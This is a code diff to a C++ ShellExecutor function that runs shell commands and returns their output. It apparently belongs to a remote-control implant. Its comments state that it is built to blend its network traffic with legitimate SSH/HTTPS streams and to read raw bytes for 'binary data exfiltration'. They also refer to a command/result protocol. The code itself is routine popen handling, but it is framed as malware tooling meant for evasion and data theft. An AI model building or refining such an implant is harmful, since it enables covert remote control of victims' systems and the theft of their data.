@@ -23,21 +23,24 @@ ShellExecutor::Result ShellExecutor::execute(const std::string& command) const {
         return result;
     }
 
-    // Read output in CHUNK_SIZE-byte increments (4096 = system page size).
-    // This matches the default libc I/O buffer, making traffic indistinguishable
-    // from legitimate SSH/HTTPS streams at the network layer.
+    // Read output in CHUNK_SIZE-byte increments using fread() — not fgets().
+    // fgets() is line-oriented and NUL-terminated: it silently truncates output at
+    // any embedded NUL byte, making it unsuitable for binary data exfiltration.
+    // fread() reads raw bytes and correctly reports the exact number read.
     std::array<char, CHUNK_SIZE> buffer;
-    while (::fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
-        result.output += buffer.data();
+    while (true) {
+        const size_t n = ::fread(buffer.data(), 1, buffer.size(), pipe);
+        if (n == 0) break;
+        result.output.append(buffer.data(), n);
     }
 
     // pclose() waits for the child process and returns its exit status.
     const int exit_code = ::pclose(pipe);
     result.success = (exit_code == 0);
 
-    if (result.output.empty()) {
-        result.output = "[ShellExecutor] Command produced no output.";
-    }
+    // NOTE: empty output is valid and intentional (e.g. touch, mkdir, chmod).
+    // The protocol's CMD_RES status=1 byte already signals end-of-output.
+    // Do NOT replace empty output with a synthetic string — it corrupts semantics.
 
     return result;
 }
